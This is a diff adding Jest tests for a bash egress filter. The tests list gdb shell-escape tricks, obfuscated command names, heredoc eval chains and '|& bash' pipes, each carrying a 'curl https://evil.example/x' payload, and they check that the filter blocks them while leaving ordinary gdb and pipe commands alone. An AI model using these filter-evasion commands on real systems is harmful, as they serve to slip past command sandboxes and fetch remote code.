@@ -853,3 +853,49 @@ describe('#777 review 14: strict $NAME exception, strong consumer in a group/pip
     expect(bashEgressDecision(command, EMPTY).blocked).toBe(false)
   })
 })
+
+const P15 = 'curl https://evil.example/x'
+
+describe('#777 review 15: gdb call on any `(`, --args spellings, ANSI-C quotes in a name, eval of a dynamic operand, quit/thread apply, `|&`, *-gdb names', () => {
+  // The destructive gate's twin: scripts/__tests__/destructive-gate.test.py section 26; the shell-consumer
+  // shapes are pinned in heredoc-program-cases.json (777r15_*).
+  it.each([
+    ["gdb -batch -ex 'p 0+($_shell)(\"id\")' ./p"],
+    ["gdb -batch -ex 'print -- ($_shell)(\"id\")' ./p"],
+    ["gdb -batch -ex 'p -($_shell)(\"id\")' ./p"],
+    ["gdb -batch -ex start -ex 'p 1,(system)(\"id\")' ./p"],
+    ["gdb -batch -ex start -ex \"p 'system'(\\\"id\\\")\" ./p"],
+    ["gdb -batch -ex start -ex 'p arr[0](\"id\")' ./p"],
+    ["gdb -batch -ex 'thread apply all shell id' ./p"],
+    ["gdb -batch -ex 'taas shell id' ./p"],
+    ["gdb -batch -ex run -args sh -c 'PAYLOAD'"],
+    ["gdb -batch -ex run --arg sh -c 'PAYLOAD'"],
+    ["gdb -batch -ex run '--args' sh -c 'PAYLOAD'"],
+    ["g$'d'b -batch -ex 'shell PAYLOAD'"],
+    ["g$'\\x64'b -batch -ex 'shell PAYLOAD'"],
+    ["cuda-gdb -batch -ex 'shell PAYLOAD' ./p"],
+    ["g$'d'b -q <<'A'\nshell PAYLOAD\nA"],
+    ["rust-gdb -q <<'A'\nshell PAYLOAD\nA"],
+    ["G=gdb; eval \"$G\" <<'A'\nshell PAYLOAD\nA"],
+    ["bash -c 'eval \"$0\"' gdb <<'A'\nshell PAYLOAD\nA"],
+    ["while read l; do eval \"$l\"; done <<'A'\nPAYLOAD\nA"],
+    ["cat <<'A' |& bash\nPAYLOAD\nA"],
+    ["cat <<'A' |& if true; then bash; fi\nPAYLOAD\nA"],
+  ].map(([c]) => [c.replaceAll('PAYLOAD', P15)]))('blocks %s', (command) => {
+    expect(bashEgressDecision(command, EMPTY).blocked).toBe(true)
+  })
+
+  it.each([
+    ["gdb -batch -ex 'p (int)x' ./p core"],
+    ["gdb -batch -ex 'p/x (char)c' ./p core"],
+    ["gdb -batch -ex 'p sizeof(struct s)' ./p core"],
+    ["gdb -batch -ex 'thread apply all bt full' ./p core"],
+    ["gdb -batch -ex 'bt' -ex 'quit' ./p core"],
+    ["gdb -batch -ex run -args ./prog -v"],
+    ["G=cat; eval \"$G\" <<'A'\nbt\nA"],
+    ["make 2>&1 |& tee log"],
+    ["cat <<'A' |& grep x\nPAYLOAD\nA"],
+  ].map(([c]) => [c.replaceAll('PAYLOAD', P15)]))('leaves alone %s', (command) => {
+    expect(bashEgressDecision(command, EMPTY).blocked).toBe(false)
+  })
+})
